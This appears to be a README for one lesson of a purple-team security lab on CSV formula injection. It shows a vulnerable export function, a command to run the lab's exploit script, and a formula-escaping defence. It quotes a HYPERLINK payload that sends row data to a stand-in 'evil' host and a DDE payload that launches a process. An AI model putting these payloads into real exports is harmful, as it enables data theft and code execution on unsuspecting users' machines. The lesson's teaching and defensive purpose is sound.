# 21 — CSV / formula injection

## The flaw
```python
def export_row(name, note):
    return f"name,note\n{name},{note}"   # a leading '=' makes the cell a formula
```
A CSV is data — until a spreadsheet opens it. Any cell beginning with `=`, `+`,
`-`, or `@` is evaluated as a **formula**. So an exported value like
`=HYPERLINK("http://evil/?"&A1,"win")` silently exfiltrates the row when a victim
opens the file, and the legacy `=cmd|'/c calc'!A1` can launch a process. The tool
turns a data export into code that runs on someone else's machine.

## Run it
```bash
export PURPLEMCP_LAB_ENABLED="i-understand-this-is-a-lab"
python attacks/21_csv_injection/exploit.py
```
The exported `note` cell is `=DANGER_FORMULA(2+3)` — a live formula, not text.

## Impact
Data exfiltration and code execution on the *consumer* of the export (often a less
technical user opening it in Excel) — a stored, second-order attack.

## Defense → [`guardrails.csvsafe.escape_formula`](../../purplemcp/guardrails/csvsafe.py)
Prefix a single quote to any cell that would be read as a formula, forcing it to
text. Apply it to **every** exported cell (also quote/escape per RFC 4180).
Hardened twin: [`safe_csv.py`](../../defense/hardened_servers/safe_csv.py).
